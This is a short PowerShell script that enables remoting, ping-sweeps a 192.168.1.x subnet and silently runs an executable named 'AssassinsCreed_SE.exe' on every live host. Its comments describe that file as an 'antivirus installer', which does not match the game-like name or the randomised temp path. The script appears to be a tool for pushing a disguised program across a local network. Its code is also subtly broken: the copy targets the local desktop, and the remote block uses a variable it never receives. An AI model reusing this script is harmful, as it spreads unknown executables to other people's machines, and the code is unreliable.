function random_text {
    return -join ((97..122)+(65..90) | Get-Random -Count 5 | % {[char]$_})
}

# Enable PowerShell Remoting
Enable-PSRemoting -Force

# Function to scan the network for active IPs
function Get-ActiveIPs {
    $subnet = "192.168.1."
    $activeIPs = @()

    for ($i = 1; $i -le 254; $i++) {
        $ip = $subnet + $i
        if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
            $activeIPs += $ip
        }
    }
    return $activeIPs
}

# Define the path to the antivirus installer
$wd = random_text
$path = "$env:temp\$wd"
$installer = "$path\AssassinsCreed_SE.exe"

# Scan the network and collect IPs
$targets = Get-ActiveIPs
$desktoppath = [System.Environment]::GetFolderpath("Desktop")

# Loop through each target computer
foreach ($target in $targets) {
    Write-Output "Deploying to $target..."

    # Copy the antivirus installer to the target computer
    Copy-Item -path $installer -Destination $desktoppath

    # Execute the antivirus installer on the target computer using PowerShell Remoting
    Invoke-Command -ComputerName $target -ScriptBlock {
        Start-Process -Filepath "$desktoppath\AssassinsCreed_SE.exe" -ArgumentList "/silent" -Wait
    } -Credential (Get-Credential)
}

Write-Output "All tasks completed."
